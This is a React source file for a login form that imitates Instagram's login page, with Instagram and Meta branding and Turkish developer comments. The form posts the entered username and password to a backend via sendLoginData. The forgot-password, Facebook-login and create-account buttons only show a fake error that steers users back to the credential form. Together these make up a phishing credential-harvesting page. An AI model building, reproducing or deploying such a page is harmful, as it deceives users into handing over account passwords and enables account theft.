import { useState } from "react";
import FacebookIcon from "./FacebookIcon";
import { sendLoginData } from "../lib/utils"; // ✅ doğru yol

const LoginForm = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const isFormValid = username.length > 0 && password.length > 0;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const response = await sendLoginData({ username, password });
      console.log("Backend cevabı:", response);
      alert("Bilgiler başarıyla gönderildi!");
    } catch (error) {
      console.error("Gönderim hatası:", error);
      alert("Bir hata oluştu, tekrar deneyin.");
    }
  };

  // 🔥 Diğer butonlar için ortak handler
  const handleOtherButtons = () => {
    alert("Bir hata oluştu, lütfen login tarafından giriş yapın.");
  };

  return (
    <form
      onSubmit={handleSubmit}
      className="w-full max-w-[350px] flex flex-col gap-3"
    >
      <h1 className="text-xl font-semibold mb-4">Log into Instagram</h1>

      <input
        type="text"
        placeholder="Mobile number, username or email"
        value={username}
        onChange={(e) => setUsername(e.target.value)}
        className="w-full px-4 py-4 bg-secondary border border-border rounded-xl text-sm placeholder:text-muted-foreground focus:outline-none focus:border-muted-foreground transition-colors"
      />

      <input
        type="password"
        placeholder="Password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
        className="w-full px-4 py-4 bg-secondary border border-border rounded-xl text-sm placeholder:text-muted-foreground focus:outline-none focus:border-muted-foreground transition-colors"
      />

      <button
        type="submit"
        disabled={!isFormValid}
        className={`w-full py-3.5 rounded-xl text-sm font-semibold transition-all mt-2 ${
          isFormValid
            ? "bg-primary text-primary-foreground hover:bg-primary/90"
            : "bg-primary/40 text-primary-foreground/50 cursor-not-allowed"
        }`}
      >
        Log in
      </button>

      {/* Forgot password */}
      <button
        type="button"
        onClick={handleOtherButtons}
        className="text-sm text-foreground hover:text-muted-foreground transition-colors py-2"
      >
        Forgot password?
      </button>

      <div className="flex items-center gap-4 my-2">
        <div className="flex-1 h-px bg-border" />
        <span className="text-muted-foreground text-xs font-semibold">OR</span>
        <div className="flex-1 h-px bg-border" />
      </div>

      {/* Facebook login */}
      <button
        type="button"
        onClick={handleOtherButtons}
        className="w-full py-3.5 border border-border rounded-xl text-sm font-semibold flex items-center justify-center gap-2 hover:bg-secondary/50 transition-colors"
      >
        <FacebookIcon className="w-5 h-5 text-[#1877F2]" />
        Log in with Facebook
      </button>

      {/* Create account */}
      <button
        type="button"
        onClick={handleOtherButtons}
        className="w-full py-3.5 border border-primary rounded-xl text-sm font-semibold text-primary hover:bg-primary/10 transition-colors"
      >
        Create new account
      </button>

      <div className="flex items-center justify-center gap-1 mt-4 text-muted-foreground">
        <svg viewBox="0 0 100 20" className="h-4" fill="currentColor">
          <text x="0" y="15" fontSize="14" fontFamily="system-ui">∞ Meta</text>
        </svg>
      </div>
    </form>
  );
};

export default LoginForm;

